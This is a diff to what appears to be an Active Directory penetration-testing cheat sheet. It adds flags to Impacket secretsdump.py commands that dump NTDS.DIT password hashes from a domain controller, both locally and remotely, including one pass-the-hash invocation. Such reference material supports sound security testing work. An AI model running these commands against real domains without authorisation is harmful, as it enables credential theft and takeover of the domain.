@@ -489,9 +489,12 @@ secretsdump.py -system /root/SYSTEM -ntds /root/ntds.dit LOCAL
 secretsdump also works remotely
 
 ```java
-./secretsdump.py -dc-ip IP AD\administrator@domain -use-vss
+./secretsdump.py -dc-ip IP AD\administrator@domain -use-vss -pwd-last-set -user-status 
 ./secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\$@10.0.0.1
 ```
+
+* `-pwd-last-set`: Shows pwdLastSet attribute for each NTDS.DIT account.
+* `-user-status`: Display whether or not the user is disabled.
 
 #### Alternatives - modules
 
